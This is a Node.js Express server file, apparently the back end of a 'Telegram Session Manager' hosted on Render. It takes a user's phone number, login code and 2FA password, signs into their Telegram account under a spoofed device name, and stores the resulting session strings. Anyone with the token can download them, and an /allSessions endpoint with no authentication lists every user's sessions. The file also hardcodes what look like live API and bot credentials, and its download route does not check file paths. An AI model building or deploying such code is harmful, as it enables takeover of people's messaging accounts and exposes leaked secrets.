// index.js - Render Optimized Complete Version
const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const TelegramBot = require("node-telegram-bot-api");

const app = express();
const PORT = process.env.PORT || 3000;

// ===================== CONFIGURATION =====================
const CONFIG = {
    PORT: PORT,
    API_ID: parseInt(process.env.API_ID) || 29176644,
    API_HASH: process.env.API_HASH || "779da7ab84c393d0bec09d1be3918dec",
    BOT_TOKEN: process.env.BOT_TOKEN || "8425751771:AAFSUcrT00YSSv4vQTQybTg8T2KnivjvThY",
    ADMIN_IDS: process.env.ADMIN_IDS ? process.env.ADMIN_IDS.split(',').map(Number) : [6381012703],
    BASE_DIR: process.env.NODE_ENV === 'production' ? '/tmp/sessions' : path.join(__dirname, 'sessionStore')
};

// Create session directory
if (!fs.existsSync(CONFIG.BASE_DIR)) {
    fs.mkdirSync(CONFIG.BASE_DIR, { recursive: true });
}

// ===================== MIDDLEWARE =====================
app.use(bodyParser.json({ limit: "10mb" }));
app.use(express.static('public'));

// CORS Middleware
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// ===================== ROOT ROUTE - FIX THE ERROR =====================
app.get('/', (req, res) => {
    res.json({
        status: 'success',
        message: 'Telegram Session Manager API is running!',
        version: '2.0.0',
        server: 'Render.com',
        timestamp: new Date().toISOString(),
        endpoints: {
            home: 'GET /',
            health: 'GET /health',
            sendOtp: 'POST /sendOtp',
            verify: 'POST /verify',
            sessionList: 'GET /sessionList?token=YOUR_TOKEN',
            download: 'GET /download/:filename?token=YOUR_TOKEN',
            allSessions: 'GET /allSessions'
        },
        documentation: 'Visit / for API documentation'
    });
});

// Health check endpoint (Render requires this)
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        environment: process.env.NODE_ENV || 'development'
    });
});

// ===================== HELPER FUNCTIONS =====================
function getUserFolder(token) {
    const safe = token.replace(/[^a-zA-Z0-9_-]/g, "_");
    const folder = path.join(CONFIG.BASE_DIR, safe);
    if (!fs.existsSync(folder)) {
        fs.mkdirSync(folder, { recursive: true });
    }
    return folder;
}

let tempSessions = {};

// ===================== API ROUTES =====================

// Send OTP
app.post("/sendOtp", async (req, res) => {
    try {
        const { countryCode, phone, token } = req.body;
        const fullPhone = countryCode + phone;

        if (!fullPhone || !token) {
            return res.json({ ok: false, error: "Phone and token required" });
        }

        const session = new StringSession("");
        const client = new TelegramClient(session, CONFIG.API_ID, CONFIG.API_HASH, {
            connectionRetries: 5,
            deviceModel: "Samsung Galaxy S23",
            systemVersion: "Android 13",
            appVersion: "12.2.10",
            langCode: "en"
        });

        await client.connect();
        client.setLogLevel("none");

        const { Api } = require("telegram/tl");
        const sent = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: fullPhone,
                apiId: CONFIG.API_ID,
                apiHash: CONFIG.API_HASH,
                settings: new Api.CodeSettings({
                    allow_flashcall: false,
                    current_number: false,
                    allow_app_hash: true,
                }),
            })
        );

        tempSessions[fullPhone] = { 
            client, 
            session, 
            hash: sent.phoneCodeHash, 
            time: Date.now(),
            token 
        };

        // Auto disconnect after 2 minutes
        setTimeout(() => {
            try { 
                if (client.connected) client.disconnect(); 
                delete tempSessions[fullPhone];
            } catch {}
        }, 120000);

        return res.json({ 
            ok: true, 
            message: "OTP sent successfully",
            phone: fullPhone
        });
    } catch (err) {
        console.error("Send OTP Error:", err);
        return res.json({ 
            ok: false, 
            error: err.message,
            details: "Failed to send OTP. Check phone number and try again."
        });
    }
});

// Verify OTP
app.post("/verify", async (req, res) => {
    try {
        const { phone, code, password, token } = req.body;
        
        if (!tempSessions[phone]) {
            return res.json({ 
                ok: false, 
                error: "Session expired or not found. Please request OTP again." 
            });
        }

        const { client, session, hash, time } = tempSessions[phone];

        // Check if OTP expired (3 minutes)
        if (Date.now() - time > 180000) {
            try { client.disconnect(); } catch {}
            delete tempSessions[phone];
            return res.json({ 
                ok: false, 
                error: "OTP timeout expired. Please request a new OTP." 
            });
        }

        const { Api } = require("telegram/tl");
        let result;
        
        try {
            result = await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCode: code,
                    phoneCodeHash: hash,
                })
            );
        } catch (err) {
            if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
                if (!password) {
                    return res.json({ 
                        ok: false, 
                        error: "2FA_PASSWORD_REQUIRED" 
                    });
                }
                result = await client.invoke(
                    new Api.auth.CheckPassword({ password })
                );
            } else {
                throw err;
            }
        }

        const userFolder = getUserFolder(token);
        const fileName = "session_" + Date.now() + ".txt";
        const filePath = path.join(userFolder, fileName);

        fs.writeFileSync(filePath, session.save());

        // Cleanup
        try { 
            if (client.connected) client.disconnect(); 
        } catch {}
        delete tempSessions[phone];

        return res.json({ 
            ok: true, 
            message: "OTP verified successfully!",
            file: fileName,
            downloadUrl: `/download/${fileName}?token=${token}`
        });
    } catch (err) {
        console.error("Verify OTP Error:", err);
        return res.json({ 
            ok: false, 
            error: err.message,
            details: "Invalid code or server error. Please try again."
        });
    }
});

// Session List
app.get("/sessionList", (req, res) => {
    try {
        const token = req.query.token;
        if (!token) {
            return res.json({ 
                ok: false, 
                error: "Token parameter is required" 
            });
        }

        const folder = getUserFolder(token);
        
        if (!fs.existsSync(folder)) {
            return res.json({ 
                ok: true, 
                sessions: [],
                message: "No sessions found for this token" 
            });
        }

        const files = fs.readdirSync(folder)
            .filter(f => f.endsWith('.txt'))
            .map(f => ({
                name: f,
                size: fs.statSync(path.join(folder, f)).size,
                readableSize: formatBytes(fs.statSync(path.join(folder, f)).size),
                created: fs.statSync(path.join(folder, f)).birthtime,
                downloadUrl: `/download/${f}?token=${token}`
            }))
            .sort((a, b) => b.created - a.created); // Newest first

        return res.json({ 
            ok: true, 
            token: token,
            count: files.length,
            sessions: files 
        });
    } catch (err) {
        return res.json({ 
            ok: false, 
            error: err.message 
        });
    }
});

// Download Session
app.get("/download/:filename", (req, res) => {
    try {
        const token = req.query.token;
        const filename = req.params.filename;
        
        if (!token) {
            return res.status(400).send("Token parameter is required");
        }

        const folder = getUserFolder(token);
        const filePath = path.join(folder, filename);
        
        if (!fs.existsSync(filePath)) {
            return res.status(404).send("File not found");
        }

        res.download(filePath, filename);
    } catch (err) {
        res.status(500).send("Download error: " + err.message);
    }
});

// All Sessions (Admin)
app.get("/allSessions", (req, res) => {
    try {
        if (!fs.existsSync(CONFIG.BASE_DIR)) {
            return res.json({ ok: true, users: [] });
        }

        const users = fs.readdirSync(CONFIG.BASE_DIR)
            .filter(f => fs.statSync(path.join(CONFIG.BASE_DIR, f)).isDirectory());

        const result = users.map(user => {
            const userDir = path.join(CONFIG.BASE_DIR, user);
            const files = fs.readdirSync(userDir)
                .filter(f => f.endsWith('.txt'))
                .map(f => ({
                    name: f,
                    size: fs.statSync(path.join(userDir, f)).size,
                    readableSize: formatBytes(fs.statSync(path.join(userDir, f)).size)
                }));

            return {
                user: user,
                sessionCount: files.length,
                sessions: files.slice(0, 10) // Limit to 10 sessions per user
            };
        });

        res.json({ 
            ok: true, 
            totalUsers: result.length,
            users: result 
        });
    } catch (err) {
        res.json({ 
            ok: false, 
            error: err.message 
        });
    }
});

// ===================== UTILITY FUNCTIONS =====================
function formatBytes(bytes, decimals = 2) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const dm = decimals < 0 ? 0 : decimals;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
}

// ===================== START TELEGRAM BOT =====================
let bot;
if (CONFIG.BOT_TOKEN && CONFIG.BOT_TOKEN !== 'your_bot_token_here') {
    try {
        bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });
        
        bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;
            const userName = msg.from.first_name;
            
            bot.sendMessage(chatId, `
🤖 *Welcome ${userName}!*

I am your Telegram Session Manager Bot.

*Server Status:* 🟢 Online
*Server URL:* ${process.env.RENDER_EXTERNAL_URL || 'Not Available'}

*Available Commands:*
/start - Show this message
/status - Check server status
/help - Show help

*API Endpoints:*
• Send OTP: POST /sendOtp
• Verify OTP: POST /verify
• List Sessions: GET /sessionList
• Download: GET /download/:file
            `, { parse_mode: 'Markdown' });
        });

        bot.onText(/\/status/, (msg) => {
            const chatId = msg.chat.id;
            bot.sendMessage(chatId, `
🟢 *Server Status*
            
*Uptime:* ${Math.floor(process.uptime() / 60)} minutes
*Memory:* ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB
*URL:* ${process.env.RENDER_EXTERNAL_URL || 'Not set'}
*Environment:* ${process.env.NODE_ENV || 'development'}
            `, { parse_mode: 'Markdown' });
        });

        bot.onText(/\/help/, (msg) => {
            const chatId = msg.chat.id;
            bot.sendMessage(chatId, `
📖 *Help Guide*

*How to use the API:*

1. *Send OTP:*
   POST ${process.env.RENDER_EXTERNAL_URL}/sendOtp
   Body: {
     "countryCode": "+880",
     "phone": "1234567890",
     "token": "your_token"
   }

2. *Verify OTP:*
   POST ${process.env.RENDER_EXTERNAL_URL}/verify
   Body: {
     "phone": "+8801234567890",
     "code": "12345",
     "token": "your_token"
   }

3. *List Sessions:*
   GET ${process.env.RENDER_EXTERNAL_URL}/sessionList?token=your_token

*Support:* Contact admin for help.
            `, { parse_mode: 'Markdown' });
        });

        console.log("✅ Telegram Bot started successfully");
        
        // Send startup message to admin
        CONFIG.ADMIN_IDS.forEach(adminId => {
            bot.sendMessage(adminId, `🚀 Bot deployed on Render!\n\nURL: ${process.env.RENDER_EXTERNAL_URL || 'Unknown'}\nTime: ${new Date().toLocaleString()}`);
        });
        
    } catch (error) {
        console.error("❌ Failed to start Telegram Bot:", error.message);
    }
} else {
    console.log("⚠️ BOT_TOKEN not provided, Telegram Bot not started");
}

// ===================== 404 HANDLER =====================
app.use((req, res) => {
    res.status(404).json({
        ok: false,
        error: "Endpoint not found",
        path: req.path,
        method: req.method,
        availableEndpoints: [
            "GET /",
            "GET /health",
            "POST /sendOtp",
            "POST /verify", 
            "GET /sessionList",
            "GET /download/:filename",
            "GET /allSessions"
        ]
    });
});

// ===================== START SERVER =====================
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════╗
║     🚀 Telegram Session Manager     ║
╠══════════════════════════════════════╣
║ Port: ${PORT}                         ║
║ Environment: ${process.env.NODE_ENV || 'development'}        ║
║ URL: http://localhost:${PORT}         ║
║ Deployed on: Render.com              ║
║ Bot: ${bot ? '✅ Active' : '❌ Inactive'}                ║
╚══════════════════════════════════════╝
    `);
});

// Export for testing
module.exports = app;
